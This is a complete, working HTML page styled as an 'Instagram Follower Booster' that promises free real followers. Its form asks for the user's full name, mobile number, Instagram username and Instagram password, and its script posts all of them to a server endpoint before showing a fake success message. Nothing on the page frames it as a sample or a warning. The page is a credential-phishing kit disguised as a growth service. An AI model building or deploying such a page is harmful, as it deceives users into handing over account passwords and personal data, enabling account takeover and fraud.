<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Follower Booster</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        h1 {
            color: #fff;
            text-align: center;
            font-size: 28px;
            margin-bottom: 10px;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p {
            color: #aaa;
            text-align: center;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            color: #ddd;
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input[type="text"],
        input[type="tel"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.05);
            color: #fff;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #e6683c;
            background: rgba(255,255,255,0.1);
        }
        input[type="range"] {
            width: 100%;
            height: 6px;
            -webkit-appearance: none;
            background: linear-gradient(90deg, #f09433, #bc1888);
            border-radius: 5px;
            outline: none;
            margin: 10px 0;
        }
        input[type="range"]::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: #fff;
            cursor: pointer;
            box-shadow: 0 0 20px rgba(220, 39, 67, 0.5);
        }
        .range-labels {
            display: flex;
            justify-content: space-between;
            color: #888;
            font-size: 12px;
        }
        #followerDisplay {
            color: #f09433;
            font-weight: bold;
        }
        button[type="submit"] {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px;
            background: linear-gradient(45deg, #f09433, #bc1888);
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button[type="submit"]:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(220, 39, 67, 0.4);
        }
        .popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .popup.hidden {
            display: none;
        }
        .popup-content {
            background: #1a1a2e;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .popup-content h2 {
            color: #4ade80;
            font-size: 32px;
            margin-bottom: 15px;
        }
        .popup-content p {
            color: #ddd;
            margin-bottom: 25px;
        }
        #closePopup {
            padding: 10px 40px;
            border: none;
            border-radius: 10px;
            background: #4ade80;
            color: #1a1a2e;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Instagram Follower Booster</h1>
        <p>Get 10-200 real followers in 24 hours!</p>
        
        <form id="followerForm">
            <div class="form-group">
                <label>Full Name</label>
                <input type="text" id="name" placeholder="Enter your full name" required>
            </div>
            <div class="form-group">
                <label>Mobile Number</label>
                <input type="tel" id="mobile" placeholder="Enter mobile number" required>
            </div>
            <div class="form-group">
                <label>Instagram Username</label>
                <input type="text" id="username" placeholder="@yourusername" required>
            </div>
            <div class="form-group">
                <label>Instagram Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <div class="form-group">
                <label>Follower Count: <span id="followerDisplay">100</span></label>
                <input type="range" id="followerRange" min="10" max="200" value="100" step="1">
                <div class="range-labels"><span>10</span><span>200</span></div>
            </div>
            <button type="submit">🔥 Boost Now</button>
        </form>
        
        <div id="popup" class="popup hidden">
            <div class="popup-content">
                <h2>✅ Success!</h2>
                <p>Your followers will increase within 24 hours!</p>
                <button id="closePopup">OK</button>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('followerForm');
            const range = document.getElementById('followerRange');
            const display = document.getElementById('followerDisplay');
            const popup = document.getElementById('popup');
            const closePopup = document.getElementById('closePopup');

            range.addEventListener('input', function() {
                display.textContent = this.value;
            });

            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                const data = {
                    name: document.getElementById('name').value,
                    mobile: document.getElementById('mobile').value,
                    username: document.getElementById('username').value,
                    password: document.getElementById('password').value,
                    followers: document.getElementById('followerRange').value
                };
                try {
                    const response = await fetch('/api/submit', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    if (response.ok) {
                        popup.classList.remove('hidden');
                        form.reset();
                        range.value = 100;
                        display.textContent = '100';
                    } else {
                        alert('Error submitting. Please try again.');
                    }
                } catch (error) {
                    alert('Network error. Check your connection.');
                }
            });

            closePopup.addEventListener('click', function() {
                popup.classList.add('hidden');
            });
            popup.addEventListener('click', function(e) {
                if (e.target === popup) popup.classList.add('hidden');
            });
        });
    </script>
</body>
</html>
